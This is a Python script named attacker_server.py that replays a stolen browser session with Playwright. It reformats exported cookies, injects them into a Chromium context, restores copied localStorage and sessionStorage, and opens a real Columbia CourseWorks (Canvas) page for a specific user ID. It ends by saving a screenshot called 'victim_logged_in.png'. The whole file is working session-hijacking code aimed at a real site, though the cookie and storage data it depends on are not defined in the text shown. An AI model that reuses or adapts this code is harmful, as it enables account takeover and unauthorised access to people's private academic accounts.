# attacker_server.py
from playwright.sync_api import sync_playwright
import json


def clean_cookies_for_playwright(cookies):
    """Convert browser-exported cookies to Playwright format"""
    cleaned = []
    for cookie in cookies:
        # Create a copy to avoid modifying original
        clean_cookie = cookie.copy()

        # Handle sameSite conversion
        if "sameSite" in clean_cookie:
            same_site = clean_cookie["sameSite"].lower()
            if same_site in ["unspecified", "no_restriction", ""]:
                # "unspecified" usually means no sameSite was set
                # In Playwright, omit it or use "Lax" as default
                del clean_cookie["sameSite"]
            elif same_site == "none":
                clean_cookie["sameSite"] = "None"
            elif same_site == "lax":
                clean_cookie["sameSite"] = "Lax"
            elif same_site == "strict":
                clean_cookie["sameSite"] = "Strict"
            else:
                # Remove invalid values
                del clean_cookie["sameSite"]

        # Remove browser-specific fields that Playwright doesn't use
        for field in ["hostOnly", "storeId", "session"]:
            clean_cookie.pop(field, None)

        cleaned.append(clean_cookie)

    return cleaned


def use_canvas_session():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        cleaned_cookies = clean_cookies_for_playwright(cookies)
        context.add_cookies(cleaned_cookies)

        page = context.new_page()

        page.goto("https://courseworks2.columbia.edu/users/755071/external_tools/10924")

        page.evaluate(
            f"""
            const storage = {json.dumps(storage)};
            Object.entries(storage.localStorage).forEach(([key, value]) => 
                localStorage.setItem(key, value)
            );
            Object.entries(storage.sessionStorage).forEach(([key, value]) =>
                sessionStorage.setItem(key, value)
            );
        """
        )

        page.reload()

        page.screenshot(path="victim_logged_in.png")
